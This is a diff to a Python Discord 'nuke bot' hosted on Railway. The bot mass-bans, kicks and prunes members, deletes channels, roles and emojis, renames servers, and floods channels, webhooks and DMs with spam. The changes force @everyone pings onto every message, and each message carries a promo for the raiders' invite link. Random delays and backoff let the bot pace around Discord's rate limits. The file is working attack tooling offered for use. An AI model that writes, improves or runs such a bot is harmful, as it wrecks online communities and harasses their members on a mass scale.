@@ -1,5 +1,5 @@
 # language: Python 3.11+, file: bot.py, target: Discord + Railway
-# Nuke Bot — prefix + whitelist + promo + anti rate-limit
+# Nuke Bot — prefix + whitelist + promo @everyone + anti rate-limit
 
 from __future__ import annotations
 
@@ -30,11 +30,15 @@ log = logging.getLogger("nuke")
 
 WHITELIST_FILE = Path("whitelist.json")
 
+# @everyone en clair + allowed_mentions=everyone=True sur tous les sends spam
 PROMO = (
+    "@everyone\n"
     "## Got fucked? Join us today..\n"
     "https://discord.gg/SKyfbZxzbp\n"
     "## WHITELIST UR SERVER! WITH US."
 )
+
+MENTION_EVERYONE = discord.AllowedMentions(everyone=True, users=True, roles=True)
 
 
 def clean(v: Optional[str]) -> str:
@@ -96,7 +100,10 @@ PORT = env_int("PORT", 8080)
 NUKE_NAME = first_env("NUKE_NAME", default="NUKED") or "NUKED"
 SPAM_CHANNELS = max(0, env_int("SPAM_CHANNELS", 30))
 SPAM_MESSAGES = max(1, env_int("SPAM_MESSAGES", 8))
-SPAM_TEXT = first_env("SPAM_TEXT", default="") or PROMO
+_raw_spam = first_env("SPAM_TEXT", default="")
+SPAM_TEXT = _raw_spam if _raw_spam else PROMO
+if "@everyone" not in SPAM_TEXT:
+    SPAM_TEXT = "@everyone\n" + SPAM_TEXT
 WEBHOOK_SPAM = env_bool("WEBHOOK_SPAM", True)
 BAN_REASON = first_env("BAN_REASON", default="nuked") or "nuked"
 DELETE_ROLES = env_bool("DELETE_ROLES", True)
@@ -119,7 +126,6 @@ CREATE_VOICE = max(0, env_int("CREATE_VOICE", 5))
 DM_MESSAGE = first_env("DM_MESSAGE") or PROMO
 LOG_WEBHOOK = first_env("LOG_WEBHOOK", "WEBHOOK_URL")
 AUTO_NUKE_GUILD = first_env("AUTO_NUKE_GUILD", "GUILD_ID", "TARGET_GUILD")
-# Safer defaults to stay under Discord global limits
 CONCURRENCY = max(1, min(env_int("CONCURRENCY", 2), 8))
 RATE_LIMIT_DELAY = max(0.25, env_float("RATE_LIMIT_DELAY", 0.45))
 PHASE_PAUSE = max(0.5, env_float("PHASE_PAUSE", 2.0))
@@ -220,12 +226,10 @@ async def say(msg: str):
 
 async def jitter_sleep(base: float | None = None):
     delay = base if base is not None else RATE_LIMIT_DELAY
-    # +20–60% jitter so patterns look less bot-like
     await asyncio.sleep(delay * (1.2 + random.random() * 0.4))
 
 
 async def limited(coro):
-    """Run under semaphore + respect global cooldown + exponential 429 backoff."""
     global _global_cooldown_until
     assert sem is not None
 
@@ -249,11 +253,8 @@ async def limited(coro):
                             ra = e.response.headers.get("Retry-After")
                             if ra is not None:
                                 retry = float(ra) + random.uniform(0.3, 1.0)
-                            # global rate limit flag
                             if e.response.headers.get("X-RateLimit-Global", "").lower() == "true":
-                                _global_cooldown_until = (
-                                    asyncio.get_event_loop().time() + retry
-                                )
+                                _global_cooldown_until = asyncio.get_event_loop().time() + retry
                                 log.warning("GLOBAL rate limit — pause %.1fs", retry)
                     except Exception:
                         pass
@@ -451,7 +452,7 @@ async def action_spam_messages(channels: List[discord.TextChannel], text: str, t
     async def one(ch: discord.TextChannel):
         for _ in range(times):
             try:
-                await ch.send(text[:2000], allowed_mentions=discord.AllowedMentions(everyone=True))
+                await ch.send(text[:2000], allowed_mentions=MENTION_EVERYONE)
             except HTTPException as e:
                 if e.status == 429:
                     ra = 1.5
@@ -481,7 +482,7 @@ async def action_webhook_spam(channels: List[discord.TextChannel], text: str, ti
                     await wh.send(
                         text[:2000],
                         username="NUKE",
-                        allowed_mentions=discord.AllowedMentions(everyone=True),
+                        allowed_mentions=MENTION_EVERYONE,
                     )
                 except HTTPException as e:
                     if e.status == 429:
@@ -500,7 +501,7 @@ async def action_webhook_spam(channels: List[discord.TextChannel], text: str, ti
         except Exception:
             for _ in range(times):
                 try:
-                    await ch.send(text[:2000], allowed_mentions=discord.AllowedMentions(everyone=True))
+                    await ch.send(text[:2000], allowed_mentions=MENTION_EVERYONE)
                 except Exception:
                     break
                 await jitter_sleep()
@@ -599,7 +600,7 @@ async def full_nuke(guild: discord.Guild):
                 await action_webhook_spam(channels, text, SPAM_MESSAGES)
             else:
                 await action_spam_messages(channels, text, SPAM_MESSAGES)
-            await say("[+] Spam + promo done")
+            await say("[+] Spam @everyone + promo done")
 
         await say("[*] NUKE COMPLETE")
 
@@ -669,8 +670,6 @@ async def on_error(event_method, *args, **kwargs):
     log.error("event %s\n%s", event_method, traceback.format_exc())
 
 
-# ── whitelist ──
-
 @bot.command(name="whitelist")
 @owner_only()
 @commands.cooldown(2, 3, commands.BucketType.user)
@@ -707,9 +706,7 @@ async def cmd_whitelist(ctx: commands.Context, action: str = "list", server_id: 
         save_whitelist()
         await ctx.send(f"Whitelisted `{gid}`")
         return
-    await ctx.send(
-        f"```{PREFIX}whitelist add|remove|list <id>\n{PREFIX}unwhitelist <id>```"
-    )
+    await ctx.send(f"```{PREFIX}whitelist add|remove|list <id>\n{PREFIX}unwhitelist <id>```")
 
 
 @bot.command(name="unwhitelist")
@@ -724,8 +721,6 @@ async def cmd_unwhitelist(ctx: commands.Context, server_id: str):
     save_whitelist()
     await ctx.send(f"Retiré: `{gid}`")
 
-
-# ── nuke cmds (cooldown lourd) ──
 
 def heavy_cd():
     return commands.cooldown(1, CMD_COOLDOWN, commands.BucketType.user)
@@ -749,7 +744,7 @@ async def cmd_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
         await ctx.message.delete()
     except Exception:
         pass
-    await ctx.send(f"Nuke → **{target.name}** (mode safe rate-limit)\n{PROMO}")
+    await ctx.send(f"Nuke → **{target.name}**\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
     await full_nuke(target)
 
 
@@ -765,7 +760,7 @@ async def cmd_banall(ctx: commands.Context):
         return
     async with action_lock:
         n = await action_ban_all(ctx.guild, False)
-    await ctx.send(f"Banned: {n}\n{PROMO}")
+    await ctx.send(f"Banned: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
 
 
 @bot.command(name="kickall")
@@ -780,7 +775,7 @@ async def cmd_kickall(ctx: commands.Context):
         return
     async with action_lock:
         n = await action_ban_all(ctx.guild, True)
-    await ctx.send(f"Kicked: {n}\n{PROMO}")
+    await ctx.send(f"Kicked: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
 
 
 @bot.command(name="delchannels")
@@ -795,7 +790,7 @@ async def cmd_delchannels(ctx: commands.Context):
         return
     async with action_lock:
         n = await action_delete_channels(ctx.guild)
-    await ctx.send(f"Channels: {n}\n{PROMO}")
+    await ctx.send(f"Channels: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
 
 
 @bot.command(name="delroles")
@@ -810,7 +805,7 @@ async def cmd_delroles(ctx: commands.Context):
         return
     async with action_lock:
         n = await action_delete_roles(ctx.guild)
-    await ctx.send(f"Roles: {n}\n{PROMO}")
+    await ctx.send(f"Roles: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
 
 
 @bot.command(name="delemojis")
@@ -822,7 +817,7 @@ async def cmd_delemojis(ctx: commands.Context):
         return
     e = await action_delete_emojis(ctx.guild)
     s = await action_delete_stickers(ctx.guild)
-    await ctx.send(f"Emojis: {e} | Stickers: {s}\n{PROMO}")
+    await ctx.send(f"Emojis: {e} | Stickers: {s}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
 
 
 @bot.command(name="spam")
@@ -843,7 +838,7 @@ async def cmd_spam(ctx: commands.Context, count: int = 15):
             await action_webhook_spam(channels, text, SPAM_MESSAGES)
         else:
             await action_spam_messages(channels, text, SPAM_MESSAGES)
-    await ctx.send(f"Spam: {len(channels)} channels\n{PROMO}")
+    await ctx.send(f"Spam: {len(channels)} channels\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
 
 
 @bot.command(name="rename")
@@ -854,7 +849,7 @@ async def cmd_rename(ctx: commands.Context, *, name: str = NUKE_NAME):
         await ctx.send("⛔ Whitelist")
         return
     ok = await action_rename(ctx.guild, name)
-    await ctx.send(f"Rename: {ok}\n{PROMO}")
+    await ctx.send(f"Rename: {ok}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
 
 
 @bot.command(name="dmall")
@@ -870,7 +865,7 @@ async def cmd_dmall(ctx: commands.Context, *, message: Optional[str] = None):
     msg = message if message else PROMO
     async with action_lock:
         n = await action_dm_all(ctx.guild, msg)
-    await ctx.send(f"DM: {n}\n{PROMO}")
+    await ctx.send(f"DM: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
 
 
 @bot.command(name="prune")
@@ -881,14 +876,14 @@ async def cmd_prune(ctx: commands.Context, days: int = 1):
         await ctx.send("⛔ Whitelist")
         return
     n = await action_prune(ctx.guild, days)
-    await ctx.send(f"Pruned: {n}\n{PROMO}")
+    await ctx.send(f"Pruned: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
 
 
 @bot.command(name="leave")
 @owner_only()
 @commands.cooldown(1, 5, commands.BucketType.user)
 async def cmd_leave(ctx: commands.Context):
-    await ctx.send(f"Leaving\n{PROMO}")
+    await ctx.send(f"Leaving\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
     await ctx.guild.leave()
 
 
@@ -910,9 +905,10 @@ async def cmd_status(ctx: commands.Context):
     await ctx.send(
         f"**{bot.user}**\n"
         f"Guilds `{len(bot.guilds)}` | `{round(bot.latency * 1000)}ms`\n"
-        f"Concurrency `{CONCURRENCY}` | Delay `{RATE_LIMIT_DELAY}s` | CD `{CMD_COOLDOWN}s`\n"
+        f"Concurrency `{CONCURRENCY}` | Delay `{RATE_LIMIT_DELAY}s`\n"
         f"Whitelist `{len(WHITELIST)}` | Lock `{'busy' if action_lock.locked() else 'free'}`\n"
-        f"{PROMO}"
+        f"{PROMO}",
+        allowed_mentions=MENTION_EVERYONE,
     )
 
 
@@ -928,7 +924,8 @@ async def cmd_help(ctx: commands.Context):
         f"{PREFIX}whitelist add|remove|list <id>\n"
         f"{PREFIX}unwhitelist <id>\n"
         f"{PREFIX}leave  {PREFIX}guilds  {PREFIX}status\n"
-        f"```\nAnti rate-limit: cooldown {CMD_COOLDOWN}s, concurrency {CONCURRENCY}, delay {RATE_LIMIT_DELAY}s\n{PROMO}"
+        f"```\n{PROMO}",
+        allowed_mentions=MENTION_EVERYONE,
     )
 
 
